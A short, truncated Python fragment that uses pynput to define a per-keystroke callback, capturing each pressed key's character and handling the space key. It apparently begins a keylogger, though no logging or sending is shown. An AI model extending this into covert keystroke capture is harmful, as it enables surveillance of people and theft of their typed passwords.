from pynput import keyboard
from datetime import datetime

def when_pressed(key): #This function is called everytime a key is pressed. Key is taken as an argument.
    try:
        char = key.char 
    except AttributeError: #pynput library has Key objects for special keys like space, shift, ctrl, etc. 
        if key == keyboard.Key.space:
            char = " " 
